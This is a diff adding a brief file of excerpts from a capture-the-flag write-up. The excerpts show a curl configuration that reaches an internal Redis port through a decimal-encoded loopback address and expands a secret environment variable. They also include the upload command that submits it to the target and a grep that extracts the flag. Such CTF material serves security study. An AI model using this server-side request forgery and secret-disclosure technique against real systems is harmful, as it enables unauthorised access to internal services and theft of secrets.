@@ -1,0 +1,14 @@
+# REDISTRIBUTE
+# Code and command excerpts from the UMCS UM 2026 write-up.
+
+## Create the Redis request configuration (text)
+silent
+variable = %{FLAG}
+url = "http://2130706433:6379/"
+expand-write-out = "{{FLAG}}\n"
+
+## Create the Redis request configuration (bash)
+curl -s -F 'configuration=@flag.cfg;filename=flag.cfg' "$TARGET/curl" | tee response.html
+
+## Read the returned value (bash)
+grep -o 'UMCS{[^}]*}' response.html
